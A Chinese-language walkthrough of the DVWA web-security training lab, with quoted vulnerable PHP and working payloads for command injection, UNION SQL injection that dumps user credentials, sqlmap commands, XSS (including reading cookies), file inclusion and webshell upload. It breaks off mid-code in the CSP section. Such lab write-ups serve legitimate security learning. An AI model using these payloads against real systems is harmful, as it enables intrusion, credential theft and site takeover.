---
title: DVWA通关笔记
---

# DVWA通关笔记

DVWA 是一个入门的 Web 安全学习靶场,结合源码去学习的话，是个入门安全的好靶场，这个靶场是我刚入行的时候练习的，当时还没有记录的习惯，所以这里只提供部分题解，等以后有时间了再慢慢补上吧！

## 环境配置

DVWA、kali2020.4、火狐浏览器、中国蚁剑

firefox渗透浏览器下载：
链接：https://pan.baidu.com/s/1zBSl8CyJN6HHbsYC1JpOlQ 
提取码：zj13 

环境的搭建毫无意义，应该注重漏洞本身，这边建议直接docker拉一个镜像


```dockerfile
# 拉取镜像
docker pull sqreen/dvwa
# 部署安装
docker run -d -t -p 8888:80 sqreen/dvwa
```

## Brute Force 暴力破解

在 Web 安全领域暴力破解是一个基础技能，不仅需要好的字典，还需要具有灵活编写脚本的能力。

### Low

暴力破解一般就是加线程，然后就是看字典大不大、好不好。写的话有点浪费时间。这里提供思路吧

查看源码

```php
if( isset( $_GET[ 'Login' ] ) ) {
    # 获取用户名和密码
    $user = $_GET[ 'username' ];
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    # 查询验证用户名和密码
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
      # 输出头像和用户名
      $avatar = mysql_result( $result, 0, "avatar" );
      echo "<p>Welcome to the password protected area {$user}</p>";
    }
    else {
        登录失败
    }
    mysql_close();
}
```

源码审计，发现用户名和密码都没有进行过滤，直接单线程字典跑一下即可

### Medium

查看源码

```php
// 对用户名和密码进行了过滤
$user = $_GET[ 'username' ];
$user = mysql_real_escape_string( $user );
$pass = $_GET[ 'password' ];
$pass = mysql_real_escape_string( $pass );
$pass = md5( $pass );

// 验证用户名和密码
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

if( $result && mysql_num_rows( $result ) == 1 ) {
    登录成功
}
else {
  sleep( 2 );
    登录失败
}
```

代码审计发现这里做了一点小改动，登录失败的时候会延时 2 秒，这样爆破的速度会慢一些，爆破问题不大

### High

查看源码

```php
// 检测用户的 token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

// 过滤用户名和密码
$user = $checkToken_GET[ 'username' ];
$user = stripslashes( $user );
$user = mysql_real_escape_string( $user );
$pass = $_GET[ 'password' ];
$pass = stripslashes( $pass );
$pass = mysql_real_escape_string( $pass );
$pass = md5( $pass );

// 数据匹配
$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
$result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

if( $result && mysql_num_rows( $result ) == 1 ) {
  登录成功
}
else {
  sleep( rand( 0, 3 ) );
  登录失败
}
```

这一关增加了 token 的检测,下面简单介绍下bp爆破过程

bp拦截包，选择Pitchfork模式，并且给要破解的项带上美元符号

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce1.png)

给第一个项加playload

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce2.png)

给第二个项加playload

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce3.png)

匹配的值是需要我们去抓到的

首先将线程的值改为1

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce4.png)

然后到options中Grep-Extract中添加匹配规则

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce5.png)

选中并复制

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce6.png)

粘贴到这里

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce7.png)

找到Redirections模块设置允许重定向，选择always

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce8.png)

爆破准备环节完成，开始爆破。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce9.png)

爆破成功

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/BruteForce10.png)

## Command Injection

用户可以执行恶意代码语句，在实战中危害比较高，也称作命令执行，一般属于高危漏洞。

### Low

查看源码

```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
       // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
```

注意到这里有两个函数，stristr和php_uname

stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为"false" ，如果设置为 "true"，函数将返回 search 参数第一次出现之前的字符串部分。

php_uname（mode）这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。

这里通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致任意命令注入。

结果验证

![DVWA-CommandInjection1](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/DVWA-CommandInjection1.png)

### Medium

查看源码

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];
    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );
    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?> 
```

相比Low级别的代码，这里对ip参数做了一定过滤，str_replace把&& 、;替换为空字符,因为被过滤的只有&&与;，所以可以使用&绕过。由于使用的是str_replace把”&&” 、”;”替换为空字符，因此可以采用以下方式绕过：`127.0.0.1&;&ipconfig`

![DVWA-CommandInjection2](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/DVWA-CommandInjection2.png)

### High

查看源码

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);
    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?> 
```

这里进一步完善了黑名单，把”| ”（注意这里|后有一个空格）替换为空字符，于是 可以用”|”绕过。

![DVWA-CommandInjection](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/DVWA-CommandInjection.png)

## CSRF 跨站请求伪造

### Medium

首先尝试低级别的payload

```
http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=2&password_conf=2&Change=Change#
```

失败了，抓包看看正常修改密码和利用csrf修改密码的包有什么不一样
正常修改密码
![](https://img-blog.csdnimg.cn/71042da9e8364ff6a0037e6785c03013.png)csrf修改
![](https://img-blog.csdnimg.cn/50849edbaab3479fa0bb384a88a55569.png)
发现利用csrf构造的包差一个referer头，查看源代码可知，中级确实对referer做出了认证，
![](https://img-blog.csdnimg.cn/f76acce1317f4138ae488303564fd92d.png)
所以只需要将正常修改密码的referer信息添加到包里面就好
![](https://img-blog.csdnimg.cn/03090482b03e45fb969b6c5e1466ebab.png)
修改成功
![](https://img-blog.csdnimg.cn/aa44e5df6ec849c598f4368196792fa4.png?)

### High

正常修改密码的样子

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/csrf1.png)

可以看到高级增加了token验证，并且每次都会改变，所以这里使用XSS漏洞先获取token值切换到存储型XSS，payload：

```
<iframe src="../csrf/" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/csrf2.png)

获得token

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/csrf3.png)

构造修改密码的url并加上token值

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/csrf4.png)

修改成功

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/csrf5.png)

## File Inclusion 文件包含

### 相关知识

PHP中的文件包含语句

```php
include()        //多次包含，如果包含失败，脚本产生警告，继续运行
include_once()   //一次包含，如果包含失败，脚本产生警告，继续运行
require()        //多次包含，如果包含失败，脚本产生错误，结束执行
require_once()   //一次包含，如果包含失败，脚本产生错误，结束执行
```

本地文件包含 

```
http://localhost/php/fileInclusion/fileInclude.php?path=./name.php 
```

远程文件包含

```http
http://localhost/php/fileInclusion/fileInclude.php? path=http://10.10.10.212/php/fileInclusion/info.php
```

无视文件扩展名读取文件

直接读取图片的源代码 

```http
http://localhost/fileInclusion/fileInclusion.php? path=../DVWA\hackable\uploads/1.jpg
```

无条件解析PHP 代码

当读取到被包含文件的源码，如果遇到符合PHP 代码规范的内容，就会无条件执行,同时为图片木马提供了出路 

```http
http://10.10.10.129/fileInclusion/fileInclusion.php? path=../DVWA\hackable\uploads/1_yjh.jpg
```

### Medium

```http
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..././..././hackable/uploads/php.jpg
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/FileInclusion1.png)

### High

```http
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file://E:\wamp64\www\dvwa\hackable\uploads\php.jpg
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/FileInclusion2.png)

## Upload 文件上传

### LOW

1、首先将靶机安全等级设为low
![](https://img-blog.csdnimg.cn/20210201185140583.png?x-oss-process=image)
2、查看源码（这里的源码不是前端源码，而是后端）可知，可以上传任意文件
![](https://img-blog.csdnimg.cn/20210201185258969.png?x-oss-process=image)
3、上传一句话木马shell1.php（aaa为密码）

![](https://img-blog.csdnimg.cn/20210201185433732.png)
上传成功
![](https://img-blog.csdnimg.cn/20210201191631323.png)
通过上传成功的提示可以知道一句话木马的文件位置（红色路径），复制粘贴在浏览器url地址（去\#）后面，回车可得具体url(如下图)，复制url进蚁剑
![](https://img-blog.csdnimg.cn/20210201192041522.png)
4、用蚁剑去连接网站
![](https://img-blog.csdnimg.cn/20210201192246802.png?x-oss-process=image)
5、成功拿到网站后台内容
![](https://img-blog.csdnimg.cn/2021020119231556.png?x-oss-process=image)

### Medium

1、将靶机安全级别调为medium
![](https://img-blog.csdnimg.cn/20210201192550804.png?x-oss-process=image)
2、查看后台代码可知上传类型必须为image/jpeg，且上传大小要小于100000字节,也就是说这次我们不能直接上传php类型文件了，得要做一些处理才行
![](https://img-blog.csdnimg.cn/20210201192604843.png?x-oss-process=image)
3、打开kali自带的Burp Suite工具（这个工具是渗透测试人员常用的工具，后面看我啥时候打鸡血再写一个关于它的完美教程吧），进入proxy里的options选项，并将代理指向全部网络
![](https://img-blog.csdnimg.cn/20210201194043376.png?x-oss-process=image)![](https://img-blog.csdnimg.cn/20210201192816880.png?x-oss-process=image)
4、将windows浏览器的代理指向kali的ip地址
![](https://img-blog.csdnimg.cn/20210201194213509.png?x-oss-process=image)5、这时候再去上传一句话木马，可以发现左上角一直在转，因为被kali自带的工具拦截了。
![](https://img-blog.csdnimg.cn/2021020119440040.png?x-oss-process=image)
6、不急让它再转一会，我们先回到kali的Burp Suite工具中操作一下
![](https://img-blog.csdnimg.cn/20210201195058303.png)
7、将拦截的数据中(下图黄色标注部分)上传文件的类型改为Content-Type:image/jpeg，再点击左上角Forward，回到浏览器发现上传成功。
![](https://img-blog.csdnimg.cn/20210201194624853.png?x-oss-process=image)
![](https://img-blog.csdnimg.cn/20210201195537206.png?x-oss-process=image)
7、再用蚁剑去连接拿到网站的全部内容
![](https://img-blog.csdnimg.cn/20210201195550201.png?x-oss-process=image)

### Hight

1、首先将难度级别调整到Hight
![](https://img-blog.csdnimg.cn/20210201195637132.png)
2、打开源码进行查看，发现限制了上传文件的类型、后缀名以及大小
![](https://img-blog.csdnimg.cn/20210201195652400.png?x-oss-process=image)
3、这里的限制有点多，不仅限制了类型大小还限制了后缀，利用上面Medium的拦截欺骗方法不大行了，规矩太多，那就按规矩来，我们将一句话木马的代码直接放到图片中去，再上传这个图片。首先利用kali将'一句话木马'和图片合在一起。
![](https://img-blog.csdnimg.cn/20210201200720311.png)
![](https://img-blog.csdnimg.cn/20210201200737972.png)
4、上传，发现可以成功上传（手动狗头）
![](https://img-blog.csdnimg.cn/20210201201033810.png)
5、这次我们通过命令注入漏洞查看文件路径

```
|| find / -name 1.jpg
```

因为图片不能直接被执行，故利用文件包含漏洞解析该文件

```
http://192.168.160.128/dvwa/vulnerabilities/fi/page=file:///var/www/dvwa/hackable/uploads/1.jpg
```

成功执行
![](https://img-blog.csdnimg.cn/20210201201400889.png?x-oss-process=image)
6、连接成功后，拿到后台网页数据

## SQL Injection

### LOW

先把级别调到low

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-1.png)

输入 1‘ 返回错误，并且错误中显示我们多了一个单引号，尝试union注入

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

输入1’ #返回正常信息

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-3.png)

下面判断字段

当输入1’ order by 2 # 时正常返回。当输入1’ order by 3 # 时返回错误，说明存在两个字段。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-4.png)

下面看接下来判断哪些字段有回显，输入-1’ union select 1,2 # 发现1，2，都有回显

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-5.png)

爆出版本和数据库名

```sql
-1' union select version(),database()# 
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-6.png)

查询所有的库

```sql
-1' union select 1,group_concat(schema_name) from information_schema.schemata#
```

查询dvwa库所有的表

```sql
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-7.png)

查询users表中字段

```sql
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-8.png)

查询user和password，密码用MD5加密，随便找个网站就可以破解，形同虚设。

```sql
-1' union select 1,(select group_concat(user,password) from dvwa.users)#
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-9.png)

### Medium

先把等级跳到medium
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-10.png)

这里没有输入窗口，只能根据提供的ID做输入，并且点击submit后，url并没有任何变化，显然这里是post类型的SQL注入

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-11.png)

怎么办呢，只要思想不滑坡，方法总比困难多，我这里介绍两种方法
第一种方法利用burp抓包，然后改数据，以实现注入。这种方法比较简单类似于上面的Low级别，这里就不加赘述，如果有相关基础知识的疑问请看我的上一篇文章。第二方法是利用火狐扩展工具hackbar，进行传参，而后达到注入的效果。因为这个扩展工具在以后的SQL注入学习过程中非常重要，这里重点讲解。

首先点击submit提交一个数据，然后按下图箭头序号进行操作


![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-12.png)

可直接将post值显示出来，看到了id=1,是不是感觉看到了希望，，下面我们在这里改参数id=1',然后点击Split URL执行

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-13.png)

执行后发现报错，这里直接把 ‘ 给转义了,说明这里是个数字型注入，下面正式开始注入过程

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
```

还是老样子先判断字段，正常返回。`id=1 order by 2&Submit=Submit` 正常返回。然后输入`id=1 order by 3&Submit=Submit`返回错误，说明存在两个字段。

然后开始判断注入点`id=-1 union select 1,2&Submit=Submit`，发现1，2都有回显，所有1和2都为注入点

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-14.png)

接着开始查询数据库的内容

```sql
#查询版本和数据库名
id=-1 union select version(),database()&Submit=Submit
#查看所有的库
id=-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

查看dvwa库下的表

```sql
id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'&Submit=Submit
```

这里执行后报错，因为这关的`‘`被转义了，所以这里的sql语句就查询不了dvwa库

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'dvwa\'' at line 1
```

怎么办呢，这确实是个大问题，其实这里我们可以直接将dvwa转16进制，然后进行查询

```sql
id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761&Submit=Submit
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-15.png)

成功

后面的查询就不再赘述，单引号被转义就用十六进制转化，就ok

### High

查看源码

```php
 <?php
if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];
    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}
?>
```

由以上源码可知，这个级别在sql语句后面加了个limit函数，不要怕，可以直接用#注释，并且这里输入ID值会自动跳转到另一个页面，防止了自动化的SQL注入。当然我们本就不是以脚本小子的身份来做这道题，所以防止自动化对于本就是手工注入的我们没有意义。话不多说，直接开始。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-sql-18.png)



这个界面有点熟悉，经过我的简单判断后，发现它竟然和Low级别一摸一样，就加了个花里胡哨的limit函数，一个注释符就解决了，这里就不加赘述了，直接看Low级别。

### Impossible

又到了这个不可能级别，我们来看看它的源码

```php
<?php
if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $id = $_GET[ 'id' ];
    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();
        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```

不可能级别永远的神，这里竟然使用了PDO技术，直接杜绝了SQL注入。没意思，溜之。

## SQL Injection (Blind) 

sql盲注，这边直接sqlmap跑或者python脚本

### Low

```python
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli_blind/?id=1*&Submit=Submit#" --cookie="你的cookie" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
```

因为登录之后的页面存在sql注入，所以要指定cookie

### Medium

```python
sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/" --cookie="你的cookie" --data="id=1*&Submit=Submit" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
```

### High

从cookie 中获取 id 然后倒入到数据库中查询

```python
sqlmap -u "http://127.0.0.1:8888/vulnerabilities/sqli_blind/" --cookie="id=1*;你的cookie" --dbms=MySQL --technique=B --random-agent --flush-session -v 3
```

## Weak Session IDs 脆弱的 Session

会话认证伪造

### Low

查看源码

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
```

发现 dvwaSession 的值每次生成 +1 ，直接遍历 dvwaSession 来获取用户信息

### Medium

查看源码

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
    setcookie("dvwaSession", $cookie_value);
}
```

发现这里根据 time() 时间戳来生成 dvwaSession 的值,这里时间戳是有规律的，直接利用在线时间戳生成转换即可

### High

查看源码

```PHP
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']);
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
}
```

就多了个md5编码加密，任然可以猜解遍历

### Impossible

```php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = sha1(mt_rand() . time() . "Impossible");
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
}
```

dvwaSession 的值为 sha1（随机数+时间+“impossbile”）

## XSS-Reflected

### Low

1、先将安全等级跳到low
![](https://img-blog.csdnimg.cn/20210208162901130.png)
2、查看源代码发现没有任何的安全过滤措施
![](https://img-blog.csdnimg.cn/20210208162918529.png?x-oss-process=image)
3、直接尝试一般的xss攻击

```javascript
<script>alert('知己安全')</script>
```

![](https://img-blog.csdnimg.cn/20210208162933768.png)
成功
获取cookie

```javascript
<script>alert(document.cookie)</script>
```

### Medium

1、先把安全等级跳到medium
![](https://img-blog.csdnimg.cn/20210208163316291.png)
2、先尝试一般xss攻击发现不行
![](https://img-blog.csdnimg.cn/2021020816333331.png)
3、查看源码发现这里使用str\_replace函数对参数进行了简单的替换,过滤
![](https://img-blog.csdnimg.cn/2021020816340426.png?x-oss-process=image)
4、我们可以直接用大小写绕过

```javascript
<Script>alert('知己安全')</script>
```

成功![](https://img-blog.csdnimg.cn/20210208163500582.png)

### High

1、先把安全等级跳到high![](https://img-blog.csdnimg.cn/20210208163526874.png)
2、这里因为安全等级过高就不客套了直接查看源码，发现他这次使用了preg\_replace正则表达式对\<script\>标签进行了严格的过滤。
![](https://img-blog.csdnimg.cn/20210208163546536.png?x-oss-process=image)
3、解决方案：用别的标签代替即可例如img。
代码如下

```javascript
<img src=1 onerror=alert('知己安全')>
```

成功
![](https://img-blog.csdnimg.cn/20210208163929568.png?x-oss-process=image)

### Impossible

 impossible中文翻译为不可能的，虽然不可能但是咱还是来试一试，首先查看后台源码![](https://img-blog.csdnimg.cn/20210208163717747.png?x-oss-process=image)

可以看到使用了htmlspecialchars函数对参数进行html实体转义，就是说把我们输入的代码直接打印出来而不会被当成js脚本去执行，看到这个就已经说明无法利用XSS漏洞了。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/20210208163731215.png)

## XSS-DOM

### 相关概念

>DOM全称Document Object Model,使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。DOM型XSS其实是一种特珠类型的反射型XSS.，它是基于DOM文档对象模型的一种漏洞。基于DOM型的XSS漏洞不需要与服务器交互，他在发生在客户端处理数据阶段。

### Low

首先还是先把安全等级调到low,观察发现这里是以Select按钮选择参数，数据提交是以GET请求的方式，可以从url下手，即构造payload
![](https://img-blog.csdnimg.cn/20210208233156269.png)
![](https://img-blog.csdnimg.cn/20210208233529416.png)
查看源码，这里没有任何限制
![](https://img-blog.csdnimg.cn/20210208233337415.png)
直接构造payload即可

```go
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert('知己安全')</script>
```

![](https://img-blog.csdnimg.cn/20210208233547600.png?x-oss-process=image)

### Medium

把等级调到Medium，查看源码
![](https://img-blog.csdnimg.cn/20210208234118491.png?x-oss-process=image)
这里把我们的script给if没了（如果发现了script则输入结果自动转为English）,但是这是小问题，可以像做反射型和存储型一样换个标签构造一下就ok

```go
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=</option></select><img src=1 onerror=alert(’知己安全‘)>
```

![](https://img-blog.csdnimg.cn/20210208235029909.png?x-oss-process=image)

### High

先把等级跳到high，然后查看源码
![](https://img-blog.csdnimg.cn/20210208235149504.png?x-oss-process=image)
这里直接在服务器后端判断，指定default的值必须为select选择菜单中的值，这里就要用到URL中的一个特殊字符`#`，这个字符后的数据不会发送到服务器端，相当于绕过了后端的过滤，不需要与服务端进行交互，直接在客户端处理数据的阶段执行。

```go
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?#default=<script>alert('知己安全')</script>
```

![](https://img-blog.csdnimg.cn/20210208235625329.png?x-oss-process=image)

### Impossible

不可能级别，查看源码
![](https://img-blog.csdnimg.cn/20210208235935147.png)
Don't need to do anything, protction handled on the client side

不需要做任何事情，保护就在客户端

## XSS-Stored

### 相关概念

>存储型XSS(stored)又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。允许用户存储数据的Web应用程序都可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当攻击者再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这就是存储型XSS。存储型XSS与反射型XSS、DOM型XSS相比，具有更高的隐蔽性，危害性也更大。

### Low

1、首先将安全级别调为low
![](https://img-blog.csdnimg.cn/20210208214152657.png)
尝试一般的脚本输入
![](https://img-blog.csdnimg.cn/20210208223451417.png)
成功，每次刷新该页面都会显示该弹窗
![](https://img-blog.csdnimg.cn/20210208214428300.png)

### Medium

先调一下安全级别
![](https://img-blog.csdnimg.cn/20210208214558911.png)
这次按照low的方式再次尝试，失败，用大小写绕过仍然失败，查看源码发现这里使用htmlspecialchars函数对Massage参数进行了html实体转义，这个场景与我上一篇文章[DVWA-XSS-Reflected(low、medium、high、Impossible)](https://www.zhiji.icu/2021/02/18/dvwa-xss-reflected/)中的Impossible相同，故这里直接避开这个玩意，改在name里写入脚本。![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/dvwa-st.png)

在name里写入发现有字符限制导致我们的脚本语句不能完整输入![在这里插入图片描述](https://img-blog.csdnimg.cn/20210208215512388.png)



### High

下面我们把安全等级继续加大调到high，然后查看源码
![](https://img-blog.csdnimg.cn/20210208215826425.png?x-oss-process=image)
这次直接在name用正则表达式把咱的script给过滤了，那咱就用上一篇文章用的老办法直接改个标签就完事（这里记住输入之前像medium中那样改一下字符限制）
![](https://img-blog.csdnimg.cn/20210208220413766.png)
成功
![](https://img-blog.csdnimg.cn/20210208220127447.png)

### Impossible

又到了这个特别牛的级别，直接查看源码
![](https://img-blog.csdnimg.cn/20210208220557741.png?x-oss-process=image)
好家伙，直接把两个输入点都给html实体转义。

## Content Security Policy (CSP) Bypass

### CSP是什么

> Content Security Policy(CSP)，内容（网页）安全策略，为了缓解潜在的跨站脚本问题(XSS攻击)，浏览器的扩展程序系统引入了内容安全策略（CSP）这个概念。在先前的XSS攻击介绍中，主要都是利用函数过滤/转义输入中的特殊字符，标签，文本来应对攻击。CSP则是另外一种常用的应对XSS攻击的策略。CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。

两种方法可以启用 CSP

- 一种是通过 HTTP 响应头信息的Content-Security-Policy字段。

一种是通过网页的标签。

例如

```
$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; 
```

```php
script-src，  //脚本：只信任当前域名
object-src：  //不信任任何URL，即不加载任何资源
style-src，   //样式表：只信任cdn.example.org和third-party.org
child-src：   //必须使用HTTPS协议加载。这个已从Web标准中删除，新版本浏览器可能不支持。
```

启用CSP后，不符合 CSP 的外部资源就会被阻止加载。

### Low

查看源码

```php
 <?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.

header($headerCSP);

# These might work if you can't create your own for some reason
# https://pastebin.com/raw/R570EE00
# https://hastebin.com/raw/ohulaquzex

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
